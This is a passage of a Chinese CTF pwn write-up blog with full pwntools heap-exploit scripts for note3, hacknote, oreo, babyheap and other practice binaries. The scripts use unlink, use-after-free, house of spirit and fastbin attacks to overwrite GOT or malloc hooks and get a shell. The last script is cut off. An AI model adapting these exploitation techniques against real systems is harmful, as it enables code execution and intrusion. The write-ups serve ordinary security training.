0x6030E8</span></span><br><span class="line">    payload = p64(<span class="number">0</span>) * <span class="number">2</span> + <span class="number">0x18</span> * <span class="string">b&#x27;a&#x27;</span> + p64(<span class="number">0x6030E8</span>)</span><br><span class="line">    change(<span class="number">6</span>, payload)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;step 4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># make exit just as return</span></span><br><span class="line">    write(robots.got[<span class="string">&#x27;exit&#x27;</span>], <span class="number">0x401954</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;step 5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># set wheel cnt =3, 0x603130 in order to start robot</span></span><br><span class="line">    write(<span class="number">0x603130</span>, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># set destructor point to puts@got</span></span><br><span class="line">    change(<span class="number">1</span>, p64(robots.got[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">    start_robot()</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;New hands great!! Thx &#x27;</span>)</span><br><span class="line">    puts_addr = p.recvuntil(<span class="string">b&#x27;!\n&#x27;</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    puts_addr = u64(puts_addr)</span><br><span class="line">    log.success(<span class="string">&#x27;puts addr: &#x27;</span> + <span class="built_in">hex</span>(puts_addr))</span><br><span class="line">    libc_base = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">    log.success(<span class="string">&#x27;libc base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># make free-&gt;system</span></span><br><span class="line">    write(robots.got[<span class="string">&#x27;free&#x27;</span>], system_addr)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># make destructor point to /bin/sh addr</span></span><br><span class="line">    write(<span class="number">0x6030E8</span>, binsh_addr)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># get shell</span></span><br><span class="line">    remove(<span class="number">6</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure><h2 id="2014ZCTF-note3"><a href="#2014ZCTF-note3" class="headerlink" title="2014ZCTF note3"></a>2014ZCTF note3</h2><p><strong>难度:★★</strong></p><p>难度和前几题差不多,<strong>但有一个大坑!!</strong></p><p><strong>利用点1:</strong>如果size输入0,会存在一个无符号整型与有符号整型的比较,造成整数溢出,几乎可以无限输入</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./note3&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/aichch/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">newnote</span>(<span class="params">size,content</span>):</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;:(less than 1024)\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">p.recvuntil(<span class="string">b&#x27; content:\n&#x27;</span>)</span><br><span class="line">p.sendline(content)</span><br><span class="line">p.recvline()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;id of the note:\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="comment">#p.recvuntil(b&#x27;Delete success\n&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>(<span class="params">idx,content</span>):</span><br><span class="line">p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;the note:\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;new content:\n&#x27;</span>)</span><br><span class="line">p.sendline(content)</span><br><span class="line"><span class="comment">#p.recvuntil(b&#x27;Edit success\n&#x27;)</span></span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./note3&#x27;</span>)</span><br><span class="line">chunk0_ptr_addr=<span class="number">0x6020C8</span></span><br><span class="line">newnote(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">newnote(<span class="number">0x30</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">newnote(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">newnote(<span class="number">0x20</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">16</span>+p64(<span class="number">0x20</span>)+p64(<span class="number">0x41</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">0x20</span>)+p64(chunk0_ptr_addr-<span class="number">0x10</span>)+p64(chunk0_ptr_addr-<span class="number">0x8</span>)+p64(<span class="number">0x20</span>)</span><br><span class="line">payload+=<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0x30</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">change(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">16</span>+p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])+p64(elf.got[<span class="string">&#x27;free&#x27;</span>])</span><br><span class="line">change(<span class="number">1</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">change(<span class="number">1</span>,p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])[:-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">puts_addr=u64(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base=puts_addr-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sys_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">change(<span class="number">1</span>,p64(sys_addr)[:-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><strong>说一下刚才提到的坑</strong>,就是程序自定义的输入函数,会将输入的最后一个字符的后一字节置为0或者遇到换行符将换行符置为0,这里是第二种情况</p><p>因此在写一个got表时,就会把这个got附近的got表给修改掉,从而使程序异常退出,被一脸懵逼地卡了好久</p><p>解决办法就是p64(elf.plt[‘puts’])[:-1]这样,只发送8个字节,且第八个字节被置为0,不影响本来的数据(高地址本来就是0),如果不这样的话相邻的got表的最低字节就会变成0</p><p><strong>说到底还是怪自己没注意sendline.</strong></p><p>另外还学到了伪造unlink后项chunk的方法,即通过后项的后项的size判断后项是否被使用,并以此绕过</p><h2 id="HITCON-training-lab-10-hacknote"><a href="#HITCON-training-lab-10-hacknote" class="headerlink" title="HITCON-training lab 10 hacknote"></a>HITCON-training lab 10 hacknote</h2><p><strong>难度:★</strong></p><p>防护nx和canary</p><p>利用点是UAF,delete函数只是free没有置0,意味着其他函数照样可以继续使用该chunk,但是其又可以被分配给新的note,这样我们就具有了修改一个可以被使用的note的头的能力</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./hacknote&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">addnote</span>(<span class="params">size, content</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    r.recvuntilb(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delnote</span>(<span class="params">idx</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printnote</span>(<span class="params">idx</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">magic = <span class="number">0x08048986</span></span><br><span class="line"></span><br><span class="line">addnote(<span class="number">32</span>, <span class="string">b&quot;aaaa&quot;</span>) <span class="comment"># add note 0</span></span><br><span class="line">addnote(<span class="number">32</span>, <span class="string">b&quot;ddaa&quot;</span>) <span class="comment"># add note 1</span></span><br><span class="line"></span><br><span class="line">delnote(<span class="number">0</span>) <span class="comment"># delete note 0</span></span><br><span class="line">delnote(<span class="number">1</span>) <span class="comment"># delete note 1</span></span><br><span class="line"></span><br><span class="line">addnote(<span class="number">8</span>, p32(magic)) <span class="comment"># add note 2</span></span><br><span class="line"></span><br><span class="line">printnote(<span class="number">0</span>) <span class="comment"># print note 0</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="2014-hack-lu-oreo"><a href="#2014-hack-lu-oreo" class="headerlink" title="2014 hack.lu oreo"></a>2014 hack.lu oreo</h2><p><strong>难度:★★</strong></p><p>防护照旧</p><p>很容易发现添加操作时的读取溢出,且申请的chunk的最后四字节存放上一个chuk的指针</p><p>即用单链表存储申请的chunk</p><p>加上溢出可以控制这个指针</p><p>写的功能除了add就只剩下leave_messa了</p><p>且free时就是按照单链表来取出chunk逐个free</p><p>故利用点是house of spirit,方向是在message指向处伪造chunk,刚好程序存在一个记录chunk数的内存域,可以被视为size,只要chunk数量刚好对齐</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./oreo&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/aichch/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386/libc-2.23.so&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./oreo&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">name,des</span>):</span><br><span class="line">    p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    <span class="comment">#p.recvuntil(b&#x27;Rifle name: &#x27;)</span></span><br><span class="line">    p.sendline(name)</span><br><span class="line">    <span class="comment">#p.recvuntil(b&#x27;Rifle description: &#x27;)</span></span><br><span class="line">    p.sendline(des)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">order</span>():</span><br><span class="line">    p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.recv()</span><br><span class="line">    p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">message</span>(<span class="params">content</span>):</span><br><span class="line">    p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    <span class="comment">#p.recvuntil(b&quot;Enter any notice you&#x27;d like to submit with your order: &quot;)</span></span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line">name=<span class="string">b&#x27;a&#x27;</span>*<span class="number">27</span>+p32(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line"></span><br><span class="line">add(name,<span class="string">b&#x27;\n&#x27;</span>*<span class="number">25</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Description: &#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Description: &#x27;</span>)</span><br><span class="line">puts_addr=p.recv(<span class="number">4</span>)</span><br><span class="line">puts_addr=u32(puts_addr)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">base_addr=puts_addr-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system=base_addr+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(system))</span><br><span class="line">count = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> (count &lt; <span class="number">0x3f</span>):</span><br><span class="line">add(<span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">4</span>)</span><br><span class="line">count+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">27</span>+p32(<span class="number">0x804a2a8</span>)</span><br><span class="line">add(payload,<span class="string">b&#x27;a&#x27;</span>*<span class="number">10</span>)</span><br><span class="line">payload=<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x20</span>+p32(<span class="number">0x40</span>)+p32(<span class="number">0x100</span>)</span><br><span class="line">message(payload)</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">order()</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.recvuntil(&#x27;Okay order submitted!\n&#x27;)</span></span><br><span class="line"></span><br><span class="line">payload = p32(elf.got[<span class="string">&#x27;strlen&#x27;</span>])</span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">20</span>, payload)</span><br><span class="line"></span><br><span class="line">message(p32(system) + <span class="string">b&#x27;;/bin/sh\x00&#x27;</span>)<span class="comment">#;执行多个命令,写完后立马执行</span></span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><strong>再次记一下,puts函数遇到空字符结束,且必然会在结尾添加一个’\n’,无论结尾本身是否有换行</strong></p><h2 id="2015-9447-CTF-Search-Engine"><a href="#2015-9447-CTF-Search-Engine" class="headerlink" title="2015 9447 CTF : Search Engine"></a>2015 9447 CTF : Search Engine</h2><p><strong>难度:★★★</strong></p><p>这题的难度有一部分在于程序本身较为复杂,静态分析需要不少功夫</p><h2 id="2017-0ctf-babyheap"><a href="#2017-0ctf-babyheap" class="headerlink" title="2017 0ctf babyheap"></a>2017 0ctf babyheap</h2><p><strong>难度:★★★</strong></p><p>这题开启了pie和以上几题不同</p><p>这题关键的漏洞在于填充申请的chunk时,大小是我们自己任意指定的,而不是申请时的大小,意味着几乎无限制溢出</p><p>攻击中用到fastbin attack与unsortedbin attack</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./babyheap&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./babyheap&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/aichch/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">main_arena_offset=libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]+<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">size</span>):</span><br><span class="line">    p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Size: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fill</span>(<span class="params">idx,content</span>):</span><br><span class="line">    p.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Index: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Size: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(content)).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Content: &quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x10</span>)  <span class="comment">#idx0</span></span><br><span class="line">alloc(<span class="number">0x10</span>)  <span class="comment">#idx1</span></span><br><span class="line">alloc(<span class="number">0x10</span>)  <span class="comment">#idx2</span></span><br><span class="line">alloc(<span class="number">0x10</span>)  <span class="comment">#idx3 for overflow idx4</span></span><br><span class="line">alloc(<span class="number">0x80</span>)  <span class="comment">#idx4</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)  <span class="comment">#头插法 layout fastbin[0]-&gt;idx1-&gt;idx2-&gt;NULL</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p8(<span class="number">0x80</span>)<span class="comment">#fixed size</span></span><br><span class="line">fill(<span class="number">0</span>,payload)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x10</span>)<span class="comment">#get idx1</span></span><br><span class="line">alloc(<span class="number">0x10</span>)<span class="comment">#get idx4</span></span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x10</span> * <span class="string">b&#x27;a&#x27;</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x80</span>)<span class="comment">#idx5 avoid consolidate to top</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Content: \n&#x27;</span>)</span><br><span class="line">unsortedbin_addr=u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(unsortedbin_addr))</span><br><span class="line">main_arena=unsortedbin_addr-<span class="number">88</span></span><br><span class="line">libc_base=main_arena-main_arena_offset</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">fake_chunk_addr = main_arena - <span class="number">0x33</span></span><br><span class="line">fake_chunk = p64(fake_chunk_addr)</span><br><span class="line">fill(<span class="number">2</span>,fake_chunk)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x60</span>)</span><br><span class="line">alloc(<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">one_gadget_addr = libc_base + <span class="number">0x4527a</span></span><br><span class="line">payload = <span class="number">0x13</span> * <span class="string">b&#x27;a&#x27;</span> + p64(one_gadget_addr)</span><br><span class="line">fill(<span class="number">6</span>,payload)</span><br><span class="line">alloc(<span class="number">0x100</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>一个很关键的点在要从idx4中切割出第一个0x70大小的chunk,这样再把这个chunk释放掉才能直接控制fd,当然另外申请0x70大小的也是可行的,要多麻烦几步就是了</p><p><strong>小记0x7-0xa</strong></p><h2 id="HITCON-Training-lab14-magic-heap"><a href="#HITCON-Training-lab14-magic-heap" class="headerlink" title="HITCON Training lab14 magic heap"></a>HITCON Training lab14 magic heap</h2><p><strong>难度:★</strong></p><p>功能可以说是非常常规了,保护照旧nx和canary</p><p>漏洞点是edit时大小是由自己定的,无限制溢出</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./magicheap&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_heap</span>(<span class="params">size, content</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title 